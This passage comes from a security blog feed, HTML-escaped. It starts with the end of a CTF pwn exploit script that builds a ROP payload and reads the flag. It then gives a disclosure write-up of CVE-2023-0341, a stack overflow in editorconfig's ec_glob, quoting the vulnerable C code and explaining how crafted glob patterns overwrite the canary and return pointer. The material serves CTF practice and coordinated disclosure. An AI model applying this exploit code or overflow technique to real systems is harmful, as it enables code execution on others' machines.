class=&quot;nf&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_stack_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;784&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;flag.txt&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/typop_solved.png&quot; /&gt;&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Exploitation" /><category term="PWN" /><category term="CTF" /><summary type="html">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@#PPGPB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@&amp;amp;? .J&amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@B~ :P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@Y. 7#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@#7 .Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@P^ ~G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@&amp;amp;J ?&amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@&amp;amp;J ?&amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@P^ ~G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@#7 .Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@Y. 7#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@B~ :P@@@@@@@@@#55555555555555G@@@@@@@@@@@@@ @@@@@@@@@@@@@&amp;amp;? .J&amp;amp;@@@@@@@@@@Y ~@@@@@@@@@@@@@ @@@@@@@@@@@@@#PPGPB@@@@@@@@@@@@#PGGGGGGGGGGGGPB@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</summary></entry><entry><title type="html">CVE-2023-0341</title><link href="http://0.0.0.0:4000/2023/01/14/CVE-2023-0341.html" rel="alternate" type="text/html" title="CVE-2023-0341" /><published>2023-01-14T00:00:00+01:00</published><updated>2023-01-14T00:00:00+01:00</updated><id>http://0.0.0.0:4000/2023/01/14/CVE-2023-0341</id><content type="html" xml:base="http://0.0.0.0:4000/2023/01/14/CVE-2023-0341.html">&lt;pre style=&quot;font-size: 0.5vw; text-align: center&quot;&gt;

________/\\\\\\\\\__/\\\________/\\\__/\\\\\\\\\\\\\\\__________________/\\\\\\\\\_________/\\\\\\\_______/\\\\\\\\\_________/\\\\\\\\\\____________________/\\\\\\\________/\\\\\\\\\\_____________/\\\_________/\\\_        
 _____/\\\////////__\/\\\_______\/\\\_\/\\\///////////_________________/\\\///////\\\_____/\\\/////\\\___/\\\///////\\\_____/\\\///////\\\_________________/\\\/////\\\____/\\\///////\\\__________/\\\\\_____/\\\\\\\_       
  ___/\\\/___________\//\\\______/\\\__\/\\\___________________________\///______\//\\\___/\\\____\//\\\_\///______\//\\\___\///______/\\\_________________/\\\____\//\\\__\///______/\\\_________/\\\/\\\____\/////\\\_      
   __/\\\______________\//\\\____/\\\___\/\\\\\\\\\\\______/\\\\\\\\\\\___________/\\\/___\/\\\_____\/\\\___________/\\\/___________/\\\//____/\\\\\\\\\\\_\/\\\_____\/\\\_________/\\\//________/\\\/\/\\\________\/\\\_     
    _\/\\\_______________\//\\\__/\\\____\/\\\///////______\///////////_________/\\\//_____\/\\\_____\/\\\________/\\\//____________\////\\\__\///////////__\/\\\_____\/\\\________\////\\\_____/\\\/__\/\\\________\/\\\_    
     _\//\\\_______________\//\\\/\\\_____\/\\\_______________________________/\\\//________\/\\\_____\/\\\_____/\\\//__________________\//\\\_______________\/\\\_____\/\\\___________\//\\\__/\\\\\\\\\\\\\\\\_____\/\\\_   
      __\///\\\______________\//\\\\\______\/\\\_____________________________/\\\/___________\//\\\____/\\\____/\\\/____________/\\\______/\\\________________\//\\\____/\\\___/\\\______/\\\__\///////////\\\//______\/\\\_  
       ____\////\\\\\\\\\______\//\\\_______\/\\\\\\\\\\\\\\\________________/\\\\\\\\\\\\\\\__\///\\\\\\\/____/\\\\\\\\\\\\\\\_\///\\\\\\\\\/__________________\///\\\\\\\/___\///\\\\\\\\\/_____________\/\\\________\/\\\_ 
        _______\/////////________\///________\///////////////________________\///////////////_____\///////_____\///////////////____\/////////______________________\///////_______\/////////_______________\///_________\///_ 
&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;This post is a writeup about CVE-2023-0341: how it was discovered, analysis and the proposed patch.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Special thanks to the whole Ubuntu Security team and, in particular, to Mark Esler and Seth Arnold.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;There is a buffer overflow vulnerability in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec_glob&lt;/code&gt; function, allowing an attacker to perform an arbitrary write to the stack and possibly allowing remote code execution.&lt;/p&gt;

&lt;h2 id=&quot;finding-the-crash&quot;&gt;Finding the crash&lt;/h2&gt;

&lt;p&gt;In Ubuntu, &lt;a href=&quot;https://github.com/canonical/ubuntu-mir&quot;&gt;MIRs&lt;/a&gt; are performed before moving a package to main. This analysis allows us to understand the package before fully maintaining and supporting it.&lt;/p&gt;

&lt;p&gt;During the Security analysis of the MIR for editorconfig, Seth Arnold was worried about how the input was being handled in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec_glob&lt;/code&gt;. Mark Esler, who was the main responsible for this MIR, performed an excellent job when fuzzing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec_glob&lt;/code&gt;, finding several crashes around that function.&lt;/p&gt;

&lt;p&gt;From there, I began to analyze the crash and the code and develop a PoC.&lt;/p&gt;

&lt;h2 id=&quot;analyzing-the-code&quot;&gt;Analyzing the code&lt;/h2&gt;

&lt;p&gt;The function ec_glob takes a pattern and a string and checks if the string fulfills the pattern. The vulnerability occurs due to how the pattern is processed and written in p_pcre.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;cp&quot;&gt;#define PATTERN_MAX  4097
&lt;/span&gt;

 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ec_glob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;                    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;                      &lt;span class=&quot;n&quot;&gt;pcre_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PATTERN_MAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;^&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;                      &lt;span class=&quot;n&quot;&gt;l_pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PATTERN_MAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                       &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


   &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l_pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcre_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;pcre_str_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcre_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PATTERN_MAX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The overflow occurs in:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l_pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;During this for, several characters are read from l_pattern (c, from now on), processed and written to p_pcre. In most cases, this is performed by:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define STRING_CAT(p, string, end)  do {    \
   size_t string_len = strlen(string); \
   if (p + string_len &amp;gt;= end) \
       return -1; \
   strcat(p, string); \
   p += string_len; \
} while(0)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There is a bound check which always uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pcre_str_end&lt;/code&gt;. And that should be safe as the amount of data we can provide is limited.&lt;/p&gt;

&lt;p&gt;But we can quickly fill the buffer with how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; is processed:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;STRING_CAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[^/]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcre_str_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For every &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; we provide, 4 characters will be written into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_pcre&lt;/code&gt;. That will only allow us to quickly fill the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_pcre&lt;/code&gt; buffer as there is a bound check in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STRING_CAT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After that, we can use the default option to overflow into the c buffer:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isalnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By not using an alphanumeric character, we will write 2 characters for each input character. No bounding check so we can easily overflow the buffer.&lt;/p&gt;

&lt;p&gt;Then, we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[&lt;/code&gt; for the final part. This is what will allow us to write big amounts of data to the stack to finally reach the end of it and overflow the canary, stack pointer, return pointer and beyond.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;[&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_in_bracket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* inside brackets, we really mean bracket */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;STRING_CAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcre_str_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* check whether we have slash within the bracket */&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;_Bool&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;has_slash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;]&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;has_slash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


        &lt;span class=&quot;cm&quot;&gt;/* if we have slash in the brackets, just do it literally */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_slash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;right_bracket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;]&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;


            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right_bracket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* The right bracket may not exist*/&lt;/span&gt; 
                &lt;span class=&quot;n&quot;&gt;right_bracket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;


            &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
